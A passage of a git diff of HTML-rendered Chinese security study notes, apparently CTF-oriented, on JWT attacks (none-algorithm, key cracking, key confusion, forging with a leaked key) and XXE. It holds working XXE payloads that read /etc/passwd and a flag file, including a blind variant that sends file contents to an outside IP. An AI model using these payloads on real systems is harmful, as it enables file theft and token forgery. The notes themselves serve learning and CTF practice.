class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br><br>ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure>
 
 <p>JWT 爆破工具地址<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t jwtcrack</span><br><span class="line">docker run -it --<span class="built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure>
 
-<h3 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h3><pre><code>JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。
+<h3 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h3><pre><code class="hljs">JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。
  利用方式：jwt_tool(https://github.com/ticarpi/jwt_tool)
  用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256
 </code></pre>
 <p>密钥爆破&#x2F;泄露<br>    HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。<br>    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。<br>    jwtcrack(<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    用法：.&#x2F;jwtcrack token_here</p>
 <p>node安装jwt命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install jsonwebtoken</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure>
 
 <h3 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;private.key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>
 
 <p>验签</p>
 <h3 id="公钥泄露"><a href="#公钥泄露" class="headerlink" title="公钥泄露"></a>公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法 到 对称密钥算法  </p>
@@ -186,209 +368,397 @@
 <p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
 <h1 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h1><p>受到影响的类和函数<br><code>SimpleXMLElement</code>、&#96;DOM</p>
 <p>Document<code>、</code>simplexml_load_string&#96;<br>(libxml&lt;2.9.0, PHP 5, PHP 7)<br>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞<br>XML Entity 实体注入<br>当程序处理xml文件时，没有禁止对外部实体的处理，容易造成xxe漏洞<br>危害<br>主流是任意文件读取<br>Content-Type: text&#x2F;xml</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);	<span class="comment">//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow; <span class="comment">//从 SimpleXMLElement 对象中提取名为 &quot;ctfshow&quot; 的元素。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);	<span class="hljs-comment">//默认情况下，libxml_disable_entity_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击</span><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow; <span class="hljs-comment">//从 SimpleXMLElement 对象中提取名为 &quot;ctfshow&quot; 的元素。</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
 
 <p>XML 文件<br>一般表示带有结构的数据<br>祖父  3个叔父  8个堂弟堂妹   </p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">祖父</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">堂兄1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">堂兄2</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">叔父3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">堂兄3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">叔父4</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">祖父</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">祖父</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">堂兄1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄2</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父2</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父3</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父4</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">祖父</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span> 声明定义了整个文档的类型，<span class="meta">&lt;!ENTITY&gt;</span> 声明定义了一个实体。</span><br><span class="line">xml格式</span><br><span class="line">1 有回显时文件读取方法</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hacker</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hacker</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hacker;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span> 声明定义了整个文档的类型，<span class="hljs-meta">&lt;!ENTITY&gt;</span> 声明定义了一个实体。<br>xml格式<br>1 有回显时文件读取方法<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hacker;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure>
 
 <p>2 无回显时文件读取方法</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hacker</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">myurl</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %myurl;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">1</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">myurl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %myurl;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>1<br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>test.dtd内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%vps;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;<br>%dtd;<br>%vps;<br></code></pre></td></tr></table></figure>
 
 <h3 id="报错xxe"><a href="#报错xxe" class="headerlink" title="报错xxe"></a>报错xxe</h3><ul>
 <li>libxml&lt;&#x3D;2.8(2.9以后默认不使用外部实体)</li>
 <li>开启了报错</li>
 <li>无回显</li>
 </ul>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % a <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;!ENTITY &amp;#x25; b &quot;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">			&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">			&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">	&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%a;</span></span><br><span class="line"><span class="meta">%b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>asfddasfd<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">		&lt;!ENTITY &amp;#x25; b &quot;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">			&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">			&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">		&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">	&#x27;</span>&gt;</span></span><br><span class="hljs-meta">%a;</span><br><span class="hljs-meta">%b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>asfddasfd<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>或</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">condition</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %condition;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM 